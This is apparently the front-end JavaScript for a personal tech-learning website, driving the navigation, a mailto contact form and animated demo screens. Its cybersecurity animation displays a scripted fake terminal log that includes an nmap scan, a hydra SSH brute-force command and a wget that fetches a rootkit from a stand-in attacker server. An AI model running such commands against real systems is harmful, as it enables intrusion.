document.addEventListener("DOMContentLoaded", () => {
  // 1. Mobile Navigation Toggle
  const mobileToggle = document.querySelector(".mobile-toggle");
  const navMenu = document.querySelector(".nav-menu");
  if (mobileToggle && navMenu) {
    const menuIcon = mobileToggle.querySelector("i");
    if (menuIcon) {
      mobileToggle.addEventListener("click", () => {
        navMenu.classList.toggle("open");
        if (navMenu.classList.contains("open")) {
          menuIcon.classList.replace("fa-bars", "fa-xmark");
        } else {
          menuIcon.classList.replace("fa-xmark", "fa-bars");
        }
      });

      // Close mobile menu when nav links are clicked
      const navLinks = document.querySelectorAll(".nav-link");
      navLinks.forEach((link) => {
        link.addEventListener("click", () => {
          navMenu.classList.remove("open");
          menuIcon.classList.replace("fa-xmark", "fa-bars");
        });
      });
    }
  }

  // 2. Active Link Highlighting on Scroll
  const sections = document.querySelectorAll("section");
  window.addEventListener("scroll", () => {
    let current = "";
    sections.forEach((section) => {
      const sectionTop = section.offsetTop;
      const sectionHeight = section.clientHeight;
      if (window.scrollY >= sectionTop - 150) {
        current = section.getAttribute("id");
      }
    });

    navLinks.forEach((link) => {
      link.classList.remove("active");
      if (link.getAttribute("href") === `#${current}`) {
        link.classList.add("active");
      }
    });
  });



  // 4. Contact Form Handling
  const queryForm = document.getElementById("queryForm");
  const formFeedback = document.getElementById("formFeedback");

  if (queryForm) {
    queryForm.addEventListener("submit", (e) => {
      e.preventDefault();

      const name = document.getElementById("name").value.trim();
      const email = document.getElementById("email").value.trim();
      const message = document.getElementById("message").value.trim();

      if (!name || !email || !message) {
        showFeedback("Please fill out all fields.", "error");
        return;
      }

      // Create mailto link contents
      const recipient = "harishtechai@gmail.com";
      const subject = `HarishTechAi Query - From ${name}`;
      const body = `Name: ${name}\nEmail: ${email}\n\nQuery/Message:\n${message}`;

      // Construct mailto link
      const mailtoUrl = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;

      showFeedback("Redirecting to your mail application...", "success");

      // Redirect to open the user's default email client
      setTimeout(() => {
        window.location.href = mailtoUrl;
        queryForm.reset();
      }, 1000);
    });
  }

  function showFeedback(text, type) {
    formFeedback.textContent = text;
    formFeedback.className = `form-feedback ${type}`;

    // Hide feedback after 5 seconds
    setTimeout(() => {
      formFeedback.style.display = "none";
    }, 5000);
  }

  // 5. Interactive Dashboard Logic
  const dashboardContainer = document.querySelector(".dashboard-container");
  if (dashboardContainer) {
    const tabBtns = dashboardContainer.querySelectorAll(".tab-btn");
    const screens = dashboardContainer.querySelectorAll(".dash-screen");

    // iOS Simulator Selectors
    const simulatorBtn = dashboardContainer.querySelector(".simulator-action-btn");
    const progressFill = dashboardContainer.querySelector(".progress-fill-circle");
    const progressNum = dashboardContainer.querySelector(".progress-number");
    const simState = dashboardContainer.querySelector(".simulator-state");

    // HLD / LLD Selectors
    const sysTabs = dashboardContainer.querySelectorAll(".sys-tab-btn");
    const hldView = dashboardContainer.querySelector(".hld-view");
    const lldView = dashboardContainer.querySelector(".lld-view");

    // Cybersecurity Selectors
    const terminalBody = dashboardContainer.querySelector("#cyber-terminal-logs");
    const decrypterKey = dashboardContainer.querySelector("#decrypter-key");
    const canvas = dashboardContainer.querySelector("#cyber-matrix-rain");

    // Blockchain Selectors
    const mineBtn = dashboardContainer.querySelector("#mine-block-btn");
    const unminedBlock = dashboardContainer.querySelector("#target-mine-block");
    const hashLbl = dashboardContainer.querySelector("#bc-hash-lbl");
    const nonceLbl = dashboardContainer.querySelector("#bc-nonce-lbl");

    // Global Interval and State Registers
    let activeTabIdx = 0;
    let cycleInterval;
    let matrixInterval;
    let iosSimInterval;
    let cyberLogInterval;
    let cyberDecryptInterval;
    let iosTypingTimeout;
    let isMining = false;
    let mineAnimationId;
    let isCompiling = false;

    // iOS Live Typing Variables
    const swiftCodeText = `import SwiftUI

struct StudyView: View {
  var body: some View {
    VStack {
      Text("Learn iOS")
        .font(.title)
        .foregroundColor(.yellow)
    }
  }
}`;
    const codeContainer = dashboardContainer.querySelector(".code-body code");
    let typingIndex = 0;
    let isDeleting = false;

    function switchTab(tabId) {
      // Clean active buttons
      tabBtns.forEach(btn => {
        if (btn.getAttribute("data-tab") === tabId) {
          btn.classList.add("active");
        } else {
          btn.classList.remove("active");
        }
      });

      // Clear running timers & animations
      if (matrixInterval) clearInterval(matrixInterval);
      if (iosSimInterval) clearInterval(iosSimInterval);
      if (cyberLogInterval) clearInterval(cyberLogInterval);
      if (cyberDecryptInterval) clearInterval(cyberDecryptInterval);
      if (iosTypingTimeout) clearTimeout(iosTypingTimeout);

      // Stop mining frames
      isMining = false;
      if (mineAnimationId) cancelAnimationFrame(mineAnimationId);

      // Reset iOS compile button & progress
      isCompiling = false;
      if (simulatorBtn) {
        simulatorBtn.textContent = "Compile & Run";
        simulatorBtn.removeAttribute("data-state");
      }
      if (simState) {
        simState.textContent = "Ready";
        simState.style.color = "";
      }
      if (progressFill) {
        progressFill.style.strokeDashoffset = 251.2;
      }
      if (progressNum) {
        progressNum.textContent = "0%";
      }

      // Reset Blockchain Mine elements
      if (mineBtn) {
        mineBtn.classList.remove("mining-mode");
        mineBtn.innerHTML = '<i class="fa-solid fa-gear"></i> Start Mining';
        mineBtn.style.background = "";
        mineBtn.disabled = false;
      }
      if (unminedBlock) {
        unminedBlock.className = "chain-block block-unmined";
        const tag = unminedBlock.querySelector(".block-tag");
        if (tag) {
          tag.className = "block-tag mining-tag";
          tag.textContent = "UNMINED";
        }
      }
      if (nonceLbl) nonceLbl.textContent = "Nonce: 29814";
      if (hashLbl) hashLbl.textContent = "Hash: 8d2c49b01...";

      // Toggle Active Screen
      screens.forEach(screen => {
        if (screen.id === `dash-${tabId}`) {
          screen.classList.add("active");
          onScreenActivate(tabId);
        } else {
          screen.classList.remove("active");
        }
      });
    }

    function onScreenActivate(tabId) {
      if (tabId === "sys-design") {
        setTimeout(drawConnections, 50);
      } else if (tabId === "cyber") {
        startCyberLogs();
        startDecryption();
        startMatrixRain();
      } else if (tabId === "ios") {
        typingIndex = 0;
        isDeleting = false;
        startIosCodeTyping();
        startIosSimulator(false);
      }
    }

    function startAutoCycle() {
      cycleInterval = setInterval(() => {
        activeTabIdx = (activeTabIdx + 1) % tabBtns.length;
        const nextTabId = tabBtns[activeTabIdx].getAttribute("data-tab");
        switchTab(nextTabId);
      }, 5000);
    }

    function stopAutoCycle() {
      clearInterval(cycleInterval);
    }

    tabBtns.forEach((btn, idx) => {
      btn.addEventListener("click", () => {
        stopAutoCycle();
        activeTabIdx = idx;
        switchTab(btn.getAttribute("data-tab"));
        // Resume auto-cycle after 15 seconds of inactivity
        setTimeout(startAutoCycle, 15000);
      });
    });

    // ==========================================
    // SCREEN 1: iOS Simulator & Live Code Typing
    // ==========================================
    function startIosCodeTyping() {
      if (!codeContainer) return;
      if (iosTypingTimeout) clearTimeout(iosTypingTimeout);

      const currentText = swiftCodeText.substring(0, typingIndex);
      let highlighted = currentText
        .replace(/(import|struct|var|some|let)/g, '<span class="keyword">$1</span>')
        .replace(/("[^"]*")/g, '<span class="string">$1</span>')
        .replace(/(\.font|\.foregroundColor|\.title|\.yellow)/g, '<span class="number">$1</span>');

      codeContainer.innerHTML = highlighted + '<span class="blinking-cursor">|</span>';

      if (!isDeleting && typingIndex < swiftCodeText.length) {
        typingIndex++;
        iosTypingTimeout = setTimeout(startIosCodeTyping, 35);
      } else if (isDeleting && typingIndex > 0) {
        typingIndex--;
        iosTypingTimeout = setTimeout(startIosCodeTyping, 15);
      } else if (typingIndex === swiftCodeText.length) {
        isDeleting = true;
        iosTypingTimeout = setTimeout(startIosCodeTyping, 4000); // Pause for 4 seconds when fully typed
      } else if (typingIndex === 0) {
        isDeleting = false;
        iosTypingTimeout = setTimeout(startIosCodeTyping, 1000); // Pause 1s before typing again
      }
    }

    function startIosSimulator(userTriggered = false) {
      if (isCompiling) return;
      isCompiling = true;

      let progress = 0;
      simulatorBtn.textContent = "Compiling...";
      simState.textContent = "Connecting debugger...";

      iosSimInterval = setInterval(() => {
        progress += 4;
        if (progress > 100) progress = 100;

        const offset = 251.2 - (251.2 * progress) / 100;
        if (progressFill) progressFill.style.strokeDashoffset = offset;
        if (progressNum) progressNum.textContent = `${progress}%`;

        if (progress >= 30 && progress < 70) {
          simState.textContent = "Building targets...";
        } else if (progress >= 70 && progress < 100) {
          simState.textContent = "Linking binaries...";
        } else if (progress >= 100) {
          clearInterval(iosSimInterval);
          simState.textContent = "Running on simulator";
          simulatorBtn.textContent = "Reset App";
          isCompiling = false;

          if (userTriggered) {
            simState.textContent = "Success! Swift App Running.";
            simState.style.color = "#4ade80";
          }
        }
      }, 35);

      if (simulatorBtn.getAttribute("data-state") === "running") {
        clearInterval(iosSimInterval);
        simulatorBtn.setAttribute("data-state", "ready");
        simulatorBtn.textContent = "Compile & Run";
        simState.textContent = "Ready";
        simState.style.color = "";
        if (progressFill) progressFill.style.strokeDashoffset = 251.2;
        if (progressNum) progressNum.textContent = "0%";
        isCompiling = false;
      } else {
        if (progress >= 100) {
          simulatorBtn.setAttribute("data-state", "running");
        }
      }
    }

    simulatorBtn.addEventListener("click", () => {
      if (simulatorBtn.textContent === "Reset App") {
        simulatorBtn.textContent = "Compile & Run";
        simState.textContent = "Ready";
        simState.style.color = "";
        if (progressFill) progressFill.style.strokeDashoffset = 251.2;
        if (progressNum) progressNum.textContent = "0%";
        simulatorBtn.removeAttribute("data-state");
      } else {
        startIosSimulator(true);
      }
    });

    // ==========================================
    // SCREEN 2: System Design (HLD & LLD)
    // ==========================================
    sysTabs.forEach(btn => {
      btn.addEventListener("click", () => {
        sysTabs.forEach(b => b.classList.remove("active"));
        btn.classList.add("active");

        const mode = btn.getAttribute("data-mode");
        if (mode === "hld") {
          hldView.classList.add("active");
          lldView.classList.remove("active");
          drawConnections();
        } else {
          hldView.classList.remove("active");
          lldView.classList.add("active");
        }
      });
    });

    function drawConnections() {
      const viewport = dashboardContainer.querySelector(".sys-design-viewport");
      const svg = dashboardContainer.querySelector(".sys-connections");
      if (!viewport || !svg || !hldView.classList.contains("active")) return;

      svg.innerHTML = "";

      const client = dashboardContainer.querySelector(".client-node");
      const lb = dashboardContainer.querySelector(".lb-node");
      const services = dashboardContainer.querySelectorAll(".service-node");
      const db = dashboardContainer.querySelector(".db-node");
      const redis = dashboardContainer.querySelector(".redis-node");

      if (!client || !lb) return;

      const viewportRect = viewport.getBoundingClientRect();
      const getCenter = (el) => {
        const r = el.getBoundingClientRect();
        return {
          x: r.left - viewportRect.left + r.width / 2,
          y: r.top - viewportRect.top + r.height / 2
        };
      };

      const cCenter = getCenter(client);
      const lbCenter = getCenter(lb);

      createSvgPath(cCenter, lbCenter, svg);

      services.forEach(svc => {
        const sCenter = getCenter(svc);
        createSvgPath(lbCenter, sCenter, svg);

        if (db) {
          const dbCenter = getCenter(db);
          createSvgPath(sCenter, dbCenter, svg);
        }
        if (redis && svc.textContent.includes("Learning")) {
          const redisCenter = getCenter(redis);
          createSvgPath(sCenter, redisCenter, svg);
        }
      });
    }

    function createSvgPath(start, end, svgContainer) {
      const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
      const flow = document.createElementNS("http://www.w3.org/2000/svg", "path");

      const dx = Math.abs(end.x - start.x) * 0.5;
      const dVal = `M ${start.x} ${start.y} C ${start.x + dx} ${start.y}, ${end.x - dx} ${end.y}, ${end.x} ${end.y}`;

      path.setAttribute("d", dVal);
      path.setAttribute("class", "connection-path active");

      flow.setAttribute("d", dVal);
      flow.setAttribute("class", "packet-flow");

      svgContainer.appendChild(path);
      svgContainer.appendChild(flow);
    }

    window.addEventListener("resize", drawConnections);

    // ==========================================
    // SCREEN 3: Cybersecurity Terminal Logs & Rain
    // ==========================================
    const cyberLogs = [
      { text: "[root@localhost]# nmap -sV -T4 10.0.8.25", type: "info" },
      { text: "Scanning subnet 10.0.8.0/24 for active services...", type: "info" },
      { text: "Host found (10.0.8.25). Open ports: 22 (SSH), 80 (HTTP)", type: "info" },
      { text: "[root@localhost]# hydra -l admin -P pass.txt ssh://10.0.8.25", type: "info" },
      { text: "Executing brute-force SSH exploit on port 22...", type: "warning" },
      { text: "[ATTEMPT 1] admin:admin123 ... ACCESS DENIED", type: "danger" },
      { text: "[ATTEMPT 2] admin:password ... ACCESS DENIED", type: "danger" },
      { text: "[ATTEMPT 3] admin:cyber2026 ... ACCESS GRANTED!", type: "success" },
      { text: "[+] SSH root connection established. Executing shell...", type: "success" },
      { text: "[root@10.0.8.25]# wget http://attacker-server/rootkit.sh", type: "warning" },
      { text: "[!] ALERT: INTRUSION DETECTION SYSTEM RADAR TRIGGERED!", type: "danger" },
      { text: "[+] IDS Sandbox quarantine containment ... ENGAGED", type: "info" },
      { text: "[+] Connection terminated. Attacker IP permanently banned.", type: "success" },
      { text: "[SECURE] System integrity restored. 100% SECURE.", type: "success" }
    ];

    let logIndex = 0;

    function startCyberLogs() {
      if (cyberLogInterval) clearInterval(cyberLogInterval);
      if (terminalBody) terminalBody.innerHTML = "";
      logIndex = 0;

      cyberLogInterval = setInterval(() => {
        if (logIndex < cyberLogs.length) {
          const line = document.createElement("div");
          line.className = `log-line ${cyberLogs[logIndex].type}`;
          line.textContent = cyberLogs[logIndex].text;
          if (terminalBody) {
            terminalBody.appendChild(line);
            terminalBody.scrollTop = terminalBody.scrollHeight;
          }
          logIndex++;
        } else {
          const cursorLine = document.createElement("div");
          cursorLine.className = "log-line blinking-cursor";
          cursorLine.innerHTML = "> SYSTEM_SECURED_";
          if (terminalBody) terminalBody.appendChild(cursorLine);
          clearInterval(cyberLogInterval);
        }
      }, 150);
    }

    function startDecryption() {
      if (cyberDecryptInterval) clearInterval(cyberDecryptInterval);
      let count = 0;
      const targetKey = "BYPASS SUCCESSFUL // ACCESS ENABLED";
      const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&*";

      cyberDecryptInterval = setInterval(() => {
        let currentString = "";
        for (let i = 0; i < targetKey.length; i++) {
          if (i < count) {
            currentString += targetKey[i];
          } else {
            currentString += chars[Math.floor(Math.random() * chars.length)];
          }
        }
        if (decrypterKey) decrypterKey.textContent = currentString;

        if (count < targetKey.length) {
          count += 1.5;
        } else {
          clearInterval(cyberDecryptInterval);
          if (decrypterKey) decrypterKey.style.color = "#4ade80";
        }
      }, 15);
    }

    function startMatrixRain() {
      if (!canvas) return;
      const ctx = canvas.getContext("2d");

      canvas.width = canvas.offsetWidth;
      canvas.height = canvas.offsetHeight;

      const columns = Math.floor(canvas.width / 14) + 1;
      const yPositions = Array(columns).fill(0);
      const charsList = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ$@#&%+";

      if (matrixInterval) clearInterval(matrixInterval);

      function step() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.08)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        ctx.fillStyle = "rgba(0, 255, 102, 0.25)";
        ctx.font = "10px monospace";

        yPositions.forEach((y, index) => {
          const char = charsList[Math.floor(Math.random() * charsList.length)];
          const x = index * 14;
          ctx.fillText(char, x, y);

          if (y > canvas.height && Math.random() > 0.98) {
            yPositions[index] = 0;
          } else {
            yPositions[index] = y + 14;
          }
        });
      }

      matrixInterval = setInterval(step, 25);
    }

    // ==========================================
    // SCREEN 4: Blockchain Mining
    // ==========================================
    mineBtn.addEventListener("click", () => {
      if (isMining) return;

      if (mineBtn.textContent.includes("Start Mining")) {
        isMining = true;
        mineBtn.classList.add("mining-mode");
        mineBtn.innerHTML = '<i class="fa-solid fa-spinner text-spin"></i> Mining...';

        let nonce = 29814;

        const mineCycle = () => {
          if (!isMining) return;
          nonce += Math.floor(Math.random() * 123) + 1;
          const randomHash = "0000" + Array.from({ length: 28 }, () =>
            "0123456789abcdef"[Math.floor(Math.random() * 16)]
          ).join("");

          if (nonceLbl) nonceLbl.textContent = `Nonce: ${nonce}`;
          if (hashLbl) hashLbl.textContent = `Hash: ${randomHash.substring(0, 14)}...`;

          mineAnimationId = requestAnimationFrame(mineCycle);
        };

        mineAnimationId = requestAnimationFrame(mineCycle);

        setTimeout(() => {
          isMining = false;
          cancelAnimationFrame(mineAnimationId);
          mineBtn.classList.remove("mining-mode");
          mineBtn.innerHTML = '<i class="fa-solid fa-check"></i> Mined!';
          mineBtn.style.background = "#4ade80";
          mineBtn.disabled = true;

          if (unminedBlock) {
            unminedBlock.className = "chain-block block-validated";
            const tag = unminedBlock.querySelector(".mining-tag");
            if (tag) {
              tag.className = "block-tag secure-tag";
              tag.textContent = "VALIDATED";
            }
          }

          if (nonceLbl) nonceLbl.textContent = `Nonce: 30489`;
          if (hashLbl) hashLbl.textContent = `Hash: 0000x8d2c...`;
        }, 1500);
      }
    });

    // ==========================================
    // Brand Banner: Animating 3D Yellow Text Rendering
    // ==========================================
    class BrandTextParticleWave {
      constructor(canvasId) {
        this.canvas = document.getElementById(canvasId);
        if (!this.canvas) return;
        this.ctx = this.canvas.getContext("2d");
        
        this.fontSize = 0;
        this.letterSpacing = 0;
        this.time = 0; // Animation time factor
        
        this.init();
        window.addEventListener("resize", () => this.resize());
      }
      
      init() {
        this.resize();
        this.animate();
      }
      
      resize() {
        const container = this.canvas.parentElement;
        const width = container.clientWidth || window.innerWidth;
        this.canvas.width = Math.min(width, 1400);
        this.canvas.height = this.canvas.width > 768 ? 260 : 130; // Increased height
        
        if (this.canvas.width > 768) {
          this.fontSize = 130; // Increased width and height of text
          this.letterSpacing = 18;
        } else {
          // Responsive font scaling for mobile screens to fit 94% of the container width
          const targetWidth = this.canvas.width * 0.94;
          this.fontSize = Math.min(65, targetWidth / 9.28); // Increased size on mobile
          this.letterSpacing = Math.max(3, this.fontSize * 0.08);
        }
      }
      
      animate() {
        if (!this.canvas) return;
        requestAnimationFrame(() => this.animate());
        
        const width = this.canvas.width;
        const height = this.canvas.height;
        const ctx = this.ctx;
        
        ctx.clearRect(0, 0, width, height);
        
        this.time += 0.025; // Speed of animation
        
        // Gentle bobbing up and down
        const yOffset = Math.sin(this.time) * 8;
        
        // Dynamic perspective shifting in 3D extrusion
        const currentDepth = 8 + Math.cos(this.time * 1.2) * 2.5;
        const shiftX = Math.sin(this.time * 0.8) * 1.2;
        
        // Calculate fade-in / fade-out alpha value (opacity pulses between 0.15 and 1.0)
        const alpha = 0.575 + Math.sin(this.time * 1.2) * 0.425;
        
        ctx.save();
        ctx.globalAlpha = alpha;
        
        // Render animated 3D Yellow Text
        this.draw3DText(
          ctx, 
          "HARISHTECHAI", 
          width / 2, 
          height / 2 + yOffset, 
          this.fontSize, 
          this.letterSpacing,
          currentDepth,
          shiftX
        );
        
        ctx.restore();
      }
      
      draw3DText(ctx, text, x, y, fontSize, letterSpacing, depth, shiftX) {
        ctx.font = `900 ${fontSize}px 'Outfit', sans-serif`;
        ctx.textAlign = "center";
        ctx.textBaseline = "middle";
        if ('letterSpacing' in ctx) {
          ctx.letterSpacing = `${letterSpacing}px`;
        }
        
        // 1. Draw ambient shadow behind the 3D block
        ctx.save();
        ctx.fillStyle = "rgba(0, 0, 0, 0.4)";
        ctx.fillText(text, x + depth + 4, y + depth + 4);
        ctx.restore();
        
        // 2. Draw 3D side layers (extrusion) with a gradient shift
        for (let i = depth; i > 0; i--) {
          ctx.save();
          // Diagonal offsets with dynamic shiftX to create perspective movement
          const offsetX = i * (0.7 + shiftX * 0.05);
          const offsetY = i * 0.7;
          
          const factor = i / depth;
          const r = Math.floor(190 + (1 - factor) * 65);  // ranges 190 to 255
          const g = Math.floor(120 + (1 - factor) * 115); // ranges 120 to 235
          ctx.fillStyle = `rgb(${r}, ${g}, 0)`;
          
          ctx.fillText(text, x - offsetX, y + offsetY);
          ctx.restore();
        }
        
        // 3. Draw the main front face in bright yellow
        ctx.save();
        const faceGradient = ctx.createLinearGradient(x, y - fontSize/2, x, y + fontSize/2);
        faceGradient.addColorStop(0, "#ffffff"); // top highlight
        faceGradient.addColorStop(0.2, "#ffe600"); // bright yellow core
        faceGradient.addColorStop(1, "#cca300"); // bottom shadow gold
        ctx.fillStyle = faceGradient;
        
        ctx.fillText(text, x, y);
        ctx.restore();
        
        // 4. Draw a sharp outline to make the letters pop
        ctx.save();
        ctx.strokeStyle = "rgba(255, 255, 255, 0.75)";
        ctx.lineWidth = fontSize > 50 ? 1.5 : 0.8;
        ctx.strokeText(text, x, y);
        ctx.restore();
      }
    }
    
    new BrandTextParticleWave("brand-text-canvas");

    switchTab("ios"); // Initial screen active and resets state
    startAutoCycle();
  }
});
